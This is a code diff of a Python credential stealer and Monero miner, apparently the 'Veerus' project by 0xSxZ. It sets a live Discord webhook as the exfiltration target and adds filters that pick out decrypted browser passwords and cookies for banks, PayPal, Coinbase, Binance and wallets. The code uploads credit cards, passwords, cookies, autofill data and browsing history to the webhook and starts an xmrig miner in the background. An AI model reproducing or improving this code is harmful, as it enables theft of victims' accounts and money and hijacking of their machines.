@@ -58,7 +58,7 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "https://discord.com/api/webhooks/1011024342081085510/RDUxo_uCJ12QbgZBrdZw-1JzCpWt7gy1Lcf1yYx8gDEcHOjSrZALYUQsC5_pPQcs2ggf"
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -93,6 +93,7 @@ Founded = False
 res =  """Stealed By 0xSxZ ------------> \n\n"""
 creditcard = "=========Stealed by 0xSxZ =============\n\n"
 currency = "=========Stealed by 0xSxZ =============\n\n"
+currencyCookies = "=========Stealed by 0xSxZ =============\n\n"
 local_appdata = os.environ['LOCALAPPDATA'] + "\\"
 default_appdata = os.getenv('APPDATA')
 chromiumpaths = [
@@ -208,9 +209,9 @@ if yes == "yes":
 	print("Running : "  + str(checkIfProcessRunning("xmrig")))
 	def stealChromeWin():
 		try:
+			global currency
 			res =  """Stealed By 0xSxZ ------------> \n\n"""
 			creditcard = "=========Stealed by 0xSxZ =============\n\n"
-			currency = "=========Stealed by 0xSxZ =============\n\n"
 			try:
 				ibm = 0
 				for i in range(len(chromiumpaths)):
@@ -297,6 +298,7 @@ if yes == "yes":
 
 	def chromeCookies():
 		try:
+			global currencyCookies
 			chrcooks = ""
 			for i in range(len(chromiumpaths)):
 				db_path = chromiumpaths[i] + "\\User Data\\Default\\Network\\Cookies"
@@ -309,7 +311,6 @@ if yes == "yes":
 							if not os.path.exists(db_path):
 								db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 2"+"\\Network\\Cookies"
 								if not os.path.exists( str(chromiumpaths[i])+ "\\Network\\Cookies"):
-									print("Not existing")
 									continue
 				local_state_path = chromiumpaths[i]  + "\\Local State"
 				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
@@ -344,7 +345,15 @@ if yes == "yes":
 					Cookie value (decrypted): {decrypted_value}
 					===============================================================
 					"""
-
+					if("wallet" in host_key or "paypal" in host_key or "payeer" in host_key or "coinbase" in host_key or "binance" in host_key):
+						#print(host_key)
+						currencyCookies = currencyCookies + f"""\n\n
+						COOKIE : 
+						Host: {host_key}
+						Cookie name: {name}
+						Cookie value (decrypted): {decrypted_value}
+						===============================================================
+					\n\n"""
 					# update the cookies table with the decrypted value
 					# and make session cookie persistent
 					cursor.execute("""
@@ -361,6 +370,7 @@ if yes == "yes":
 			print(e)
 
 	def main():
+		global currency
 		binks = "==============Stealed By 0xSxZ=============="
 		for i in range(len(chromiumpaths)):
 			db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Login Data"
@@ -371,7 +381,6 @@ if yes == "yes":
 					if not os.path.exists(db_path):
 						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 2"+"\\Login Data"
 						if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
-							print("Not existing")
 							continue
 			print("Existing")
 			local_state_path = chromiumpaths[i]  + "\\Local State"
@@ -380,32 +389,33 @@ if yes == "yes":
 				if not os.path.isfile(local_state_path):
 					local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
 					if not os.path.isfile(local_state_path):
+						print("no Local state")
 						continue
 			master_key = get_master_key(local_state_path)
 			login_db = db_path
 			dbpath = str(uuid.uuid4())
+			print("667")
 			shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
 			conn = sqlite3.connect(dbpath)
 			cursor = conn.cursor()
-
-			try:
-				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-				for r in cursor.fetchall():
-					url = r[0]
-					username = r[1]
-					encrypted_password = r[2]
-					decrypted_password = decrypt_password(encrypted_password, master_key)
-					binks = binks + (f"Main URL: {url}\n")
-					binks = binks +(f"User name: {username}\n")
-					binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
-					binks = binks + ("=" * 100)
-					print(binks)
-			except Exception as e:
-				print(e)
-
+			cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+			for r in cursor.fetchall():
+				url = r[0]
+				username = r[1]
+				encrypted_password = r[2]
+				decrypted_password = decrypt_password(encrypted_password, master_key)
+				binks = binks + (f"Main URL: {url}\n")
+				binks = binks +(f"User name: {username}\n")
+				binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
+				if("billing" in url or "wallet" in url or "finance" in url or "paypal" in url or "payeer" in url or "coinbase" in url or "binance" in url or "bank" in url):
+					currency = currency + (f"\n\nMain URL: {url}\n")
+					currency = currency +(f"User name: {username}\n")
+					currency = currency +(f"Decrypted Password: {decrypted_password}\n\n")
+					currency = currency + ("=" * 100)
 			cursor.close()
 			conn.close()
-			return binks
+
+		return binks
 	def PasswLinux():
 		try:
 			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
@@ -625,7 +635,7 @@ if yes == "yes":
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --cpu-max-threads-hint=22 --background')
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=3 --background')
 
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
@@ -835,7 +845,6 @@ if yes == "yes":
 				print("[.] Executing miner..")
 	
 	if(chiffre != "" and chiffre != None):
-		getfiles()
 		print("[.] Sending")
 		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
@@ -848,6 +857,7 @@ if yes == "yes":
 		webhook.add_file(file=ccs, filename="Cr3d1t_C4rds.txt")
 		webhook.add_file(file=str(pwdd), filename="0xPasswords.txt")
 		webhook.add_file(file=str(cooky), filename="0xCookies.txt")
+
 		try:
 			autofill = stealChromeWin()
 			autfill = str(autofill).split(":::667")
@@ -856,12 +866,12 @@ if yes == "yes":
 			autfill = ["dazdaz", "dazdza", "dazdhjnza"]
 		webhook.add_file(file=autfill[0], filename="Autofill.txt")
 
-		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
-
-		"""+autfill[1] + autfill[2], filename="finance_and_money.txt")
+		
 		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
 
 		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
+		webhook.add_file(file=currency, filename="finance_and_money.txt")
+		webhook.add_file(file=currencyCookies, filename="finance_and_money_cookiest.txt")
 		webhook.execute()	
 	connectOption()
 	os.system("cd")
